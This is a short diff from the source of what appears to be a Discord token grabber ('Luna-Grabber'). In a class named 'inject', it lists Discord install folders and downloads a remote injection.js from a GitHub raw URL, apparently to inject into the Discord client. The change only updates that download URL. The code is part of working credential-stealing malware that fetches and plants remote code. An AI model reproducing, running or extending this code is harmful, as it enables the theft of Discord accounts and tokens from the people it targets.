@@ -545,7 +545,7 @@ class inject:
             self.appdata + '\\DiscordPTB', 
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/injection.js").text
             
         for dir in self.discord_dirs:
             if not os.path.exists(dir): continue    
